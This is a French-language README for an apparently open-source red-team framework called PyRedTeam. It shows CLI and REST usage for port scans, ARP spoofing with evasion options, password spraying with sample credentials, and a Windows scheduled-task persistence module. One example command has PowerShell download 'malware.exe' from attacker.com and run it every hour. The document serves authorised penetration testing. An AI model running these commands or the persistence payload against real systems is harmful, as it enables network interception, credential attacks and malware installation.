# 🛡️ PyRedTeam - Framework de Simulation d'Attaques


Framework complet pour les tests d'intrusion éthiques permettant d'exécuter des attaques simulées dans un environnement contrôlé et sécurisé.

## 🌟 Fonctionnalités Principales

- **🧩 Architecture Modulaire**  
  Ajoutez facilement de nouveaux modules d'attaque
- **🔒 Sécurité Renforcée**  
  Chiffrement AES-256 des rapports et validation des entrées
- **🌐 Mode Furtif**  
  Techniques d'évasion avancées (délais aléatoires, MAC variables)
- **📊 Journalisation Avancée**  
  Support ElasticSearch, fichiers locaux et console
- **🚀 API REST Sécurisée**  
  Gestion des attaques via HTTPS
- **🐳 Isolation Docker**  
  Environnement d'exécution sécurisé
- **📝 Rapports Personnalisables**  
  Formats JSON, YAML et HTML

## 📦 Installation

### Prérequis
- Docker
- Python 3.10+
- ElasticSearch (optionnel)

```bash
# Cloner le dépôt
git clone https://github.com/votre-utilisateur/PyRedTeam.git
cd PyRedTeam

# Construire l'image Docker
docker build -t pyredteam .

# Vérifier l'installation
docker run --rm pyredteam --list
```

## 🚀 Utilisation

### Interface en Ligne de Commande (CLI)

```bash
# Lister les modules disponibles
docker run pyredteam --list

# Exécuter un scan de ports (mode furtif)
docker run --net=host pyredteam \
  --run port_scan \
  --target 192.168.1.1 \
  --ports 22,80,443,8080-8090 \
  --covert \
  --output scan_results.json \
  --encrypt

# Exécuter un scan de ports
docker run --net=host pyredteam \
  --run port_scan \
  --target 192.168.1.1 \
  --params "ports=1-1024"

# Exécuter un ARP Spoof
docker run --net=host pyredteam \
  --run arp_spoof \
  --target 192.168.1.10 \
  --gateway 192.168.1.1 \
  --interface eth0 \
  --covert \
  --output arp_report.json

# Exécuter un Password Spray
docker run pyredteam \
  --run password_spray \
  --url http://site.com/login \
  --params '{
    "usernames": ["admin", "user", "test"],
    "passwords": ["password123", "admin123", "Welcome1"],
    "user_agent": "Mozilla/5.0"
  }' \
  --output spray_results.json \
  --encrypt

# Exécuter un Scheduled Task
docker run pyredteam \
  --run scheduled_task \
  --params '{
    "task_name": "UpdateService",
    "command": "powershell -c \"Start-BitsTransfer -Source http://attacker.com/malware.exe -Destination C:\\malware.exe; Start-Process C:\\malware.exe\"",
    "trigger": "hourly"
  }' \
  --output task_report.yaml

# Démarrer l'API REST
docker run -p 5000:5000 pyredteam --api
```

### API REST

```
Endpoint                  Méthode                   Description
/attacks	              GET	                    Liste les modules disponibles
/attack/{module}	      POST	                    Exécute une attaque spécifique
/attack/{id}	          DELETE	                Arrête une attaque en cours
```

- **Exemple avec cURL**:
```bash
curl -k -X POST https://localhost:5000/attack/port_scan \
  -H "Content-Type: application/json" \
  -d '{"target_ip": "192.168.1.1", "ports": "1-1024"}'
```

## 🧠 Architecture Technique

### Structure des Modules

**Chaque module implémente l'interface standard:**

```bash
class Attack:
    def __init__(self):
        self.logger = Logger("NomModule")
    
    def setup(self, **kwargs):
        """Configuration initiale"""
        
    def execute(self):
        """Exécution de l'attaque"""
        return {"result": "data"}
        
    def cleanup(self):
        """Nettoyage des ressources"""
```

### Modules Inclus

1. **Port Scan (```network/port_scan.py```)**

- Scan TCP de ports

- Détection des services ouverts

2. **ARP Spoof (```network/arp_spoof.py```)**

- Empoisonnement ARP

- Mode furtif (timing aléatoire, MAC variables)

3. **Password Spray (```credential/password_spray.py```)**

- Attaque par pulvérisation de mots de passe

- Support multi-protocoles

4. **Scheduled Task (```persistence/scheduled_task.py```)**

- Création de tâches planifiées

- Persistance Windows

## Sécurité

- 🔑 Chiffrement AES-256 des rapports
- 🛡️ Validation stricte des entrées
- 🐋 Isolation via Docker
- 📜 Journalisation chiffrée
- 🔐 API avec HTTPS auto-signé

## Contribution

1. Forker le dépôt
2. Créer une branche (git checkout -b feature/nouveau-module)
3. Commiter les changements (git commit -am 'Ajout module X')
4. Pusher (git push origin feature/nouveau-module)
5. Créer une Pull Request

## Licence

MIT License - Voir [LICENSE](LICENSE)
